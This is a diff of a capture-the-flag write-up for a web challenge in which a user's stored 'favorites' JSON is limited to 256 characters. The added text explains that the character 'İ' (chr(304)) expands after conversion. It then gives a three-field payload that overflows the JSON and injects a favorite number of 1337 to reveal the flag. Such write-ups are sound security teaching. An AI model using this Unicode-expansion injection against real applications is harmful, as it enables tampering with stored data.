@@ -53,20 +53,6 @@ Except for the favorite number:
 (this validates that the number is between 0 and 100)
 
 
-And except for **favortite key/value pair**:
-
-	favorite_key = request.form['favorite_key']
-	if "'" in favorite_key: error = 'Custom favorite name may not contain single quote'
-	if len(favorite_key) > 64: 'Custom favorite name too long'
-
-	favorite_value = request.form['favorite_value']
-	if "'" in favorite_value: error = 'Custom favorite may not contain single quote'
-	if len(favorite_value) > 64: 'Custom favorite too long'
-
-They have a small diffrenze they don't define the error variable if the lenght isn't right
-
-A SQL injection isn't possible but the injection of arbitrary JSON data is...
-
 ### 5.) Flag reveal
 
 	{% if favorite == 'number' and pony['favorites'][favorite] == 1337 %}
@@ -80,13 +66,21 @@ The Flag will be shown if the favorite number is 1337
 
 Let's recap:
 - the favorites Column (JSON Data) is maxed at 256 chars
-- we are able to insert an arbitrary amount of characters into a string which will get stored in this column
 - the original number/value pair gets checked and will always be appended to the end of the Json array
+- from ponydb we know that we have to overflow somehow the JSON data
 
+After playing around I noticed that the chr(304) (Python syntax) sometimes gets converted in an invisible + "i" character
 
+So the sub-string expands if beeing inserted into the main-string
 
 ## The Payload
 
+this was pretty straight forward
+important: this time three variables were needed to insert the exploit
+
+	word='aaaİİİİİİİİİİİİİİİİİİİİİİİ"}'
+	favorite_key='İİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİ'
+	favorite_value='","number":1337, "İİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİ": "'
 
 
 ## Thank you for reading :)
